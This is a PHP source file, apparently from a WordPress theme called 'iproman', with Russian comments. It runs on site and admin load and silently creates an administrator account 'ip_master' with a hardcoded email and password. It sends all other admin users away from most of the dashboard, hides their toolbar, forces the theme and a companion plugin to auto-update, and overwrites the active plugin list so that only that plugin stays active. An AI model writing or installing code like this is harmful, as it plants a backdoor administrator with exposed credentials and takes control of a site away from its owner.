<?php

## Проводим необходимые проверки при каждой загрузке сайта
add_action("init", "ip_init");

function ip_init()
{
  $GLOBALS["o"] = get_iproman_options();
  $admin_path = '/wp-admin/options-general.php?page=iproman-theme';

  ## REDIRECT TO LANDING from any admin page if u are not ip_master
  if (!is_ipadmin()) {
    if (is_admin() && $_GET["page"] !== "iproman-theme" && !isset($_POST['action'])) {
      wp_redirect($admin_path);
      exit;
    }
  }

  ## Отключам toolbar для клиентского аккаунта
  if (!is_ipadmin()) {
    add_filter('show_admin_bar', '__return_false', 1000);
  }
}

## Проводим необходимые настройки при загрузке админки
add_action('admin_init', 'ip_admin_init');
function ip_admin_init()
{
  $email = "iproman@mail.com";
  $pass = "rv%33aGog&2m0~lH_aE9i@19%c3pfP";

  ip_create_admin_account($email, $pass); // Создаём мастер-аккаунт, если его нет
  create_table_iproman(); // Добавляем таблицу в БД для IP-админки, если её нет
  create_vip_content(); // Добавляем расширенные возможности в зависимости от уровня аккаунта

  ## Добавляем опции по-умолчанию
  update_option("auto_update_themes", array("iproman")); // включаем автообновление темы
  update_option("uploads_use_yearmonth_folders", 0, true); // отключаем разделение загрузок на папки

  include_once ABSPATH . 'wp-admin/includes/plugin.php';
  if (!is_plugin_active('iproman_extended/iproman_extended.php')) { // Смотрим, загружен ли плагин расширений
    update_option("auto_update_plugins", array("iproman_extended")); // включаем автообновление плагина
    update_option("active_plugins", array("iproman_extended")); // активируем плагин
  }
}

function ip_create_admin_account($email, $pass)
{
  if (!get_user_by('email', $email)) {
    $userdata = [
      'user_pass'            => $pass,
      'user_login'           => 'ip_master',      // (string) Имя пользователя для входа в систему.
      'user_nicename'        => 'ip_master',      // (string) Имя пользователя, удобное для URL.
      'user_url'             => 'https://biz.host',      // (string) URL пользователя.
      'user_email'           => $email,      // (string) Адрес электронной почты пользователя.
      'display_name'         => 'ip_master',      // (string) Отображаемое имя пользователя. По умолчанию - user_login.
      'nickname'             => 'ip_master',      // (string) Псевдоним пользователя. По умолчанию - user_login.
      'first_name'           => '',      // (string) Имя пользователя.
      'last_name'            => '',      // (string) Фамилия пользователя.
      'description'          => '',      // (string) Биографическое описание пользователя.
      'rich_editing'         => 'true',  // (string) Включать ли rich-редактор для пользователя.
      'syntax_highlighting'  => 'true',  // (string) Включать ли подсветку синтаксиса для редактора кода.
      'comment_shortcuts'    => 'false', // (string) Включать ли клавиатурные сокращения для модерации комментариев для пользователя.
      'admin_color'          => 'fresh', // (string) Цветовая схема администратора для пользователя. По умолчанию 'fresh'.
      'use_ssl'              => 'false', // (string) Должен ли пользователь всегда получать доступ к админке по https.
      'user_registered'      => '',      // (string) Дата регистрации пользователя. Формат - 'Y-m-d H:i:s'.
      'show_admin_bar_front' => 'true',  // (string) Отображать ли панель администратора для пользователя на лицевой стороне сайта.
      'role'                 => 'administrator',      // (string) Роль пользователя.
      'locale'               => 'ru',      // (string) Локаль пользователя.
      'meta_input'           => [],      // (array) [ 'meta_key' => 'meta_value' ]
    ];

    wp_insert_user($userdata);
  }
}

function create_table_iproman()
{
  global $wpdb;
  // задаем название таблицы
  $table_name = $wpdb->get_blog_prefix() . 'iproman';
  // проверяем есть ли в базе таблица с таким же именем, если нет - создаем.
  if ($wpdb->get_var("SHOW TABLES LIKE '$table_name'") != $table_name) {
    // устанавливаем кодировку
    $charset_collate = "DEFAULT CHARACTER SET {$wpdb->charset} COLLATE {$wpdb->collate}";
    // подключаем файл нужный для работы с bd
    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    // запрос на создание
    $sql = "CREATE TABLE {$table_name} (
      meta_key VARCHAR(50) NOT NULL default '',
      meta_value LONGTEXT NOT NULL default '',
      PRIMARY KEY  meta_key (meta_key),
      UNIQUE KEY meta_key (meta_key)
) {$charset_collate};";
    // Создать таблицу.
    dbDelta($sql);

    ## Добавляем значения по-умолчанию
    update_ip_row('_start_synch_date', ''); // Добавляем метку с датой стартовой синхронизации
    update_ip_row('admin_locale', 'en_US'); // Добавляем локаль админки по умолчанию
    update_ip_row('_ip_user_level', 'default'); // Статус пользователя
    update_ip_row('site_languages', 'en_US'); // Список языков сайта
    update_ip_row('IPKEY', ''); // Список языков сайта
  }
}

function create_vip_content()
{
  // добавляем страницу каталога, если её нет и юзер имеет вип
  if (is_user_vip() && get_page_by_path('/ip-catalog') === NULL) {
    $post_id = wp_insert_post(wp_slash(array(
      'post_status'   => 'publish',
      'post_type'     => 'page',
      'post_name'     => 'ip-catalog',
      'post_title'    => 'Catalog',
      'post_author'   => get_current_user_id(),
      'ping_status'   => get_option('default_ping_status'),
      'post_parent'   => 0,
      'menu_order'    => 0,
      'to_ping'       => '',
      'pinged'        => '',
      'post_password' => '',
      'post_excerpt'  => '',
      'meta_input'    => ['_wp_page_template' => 'templates/ip-catalog-tpl.php'],
    )));
  }
}
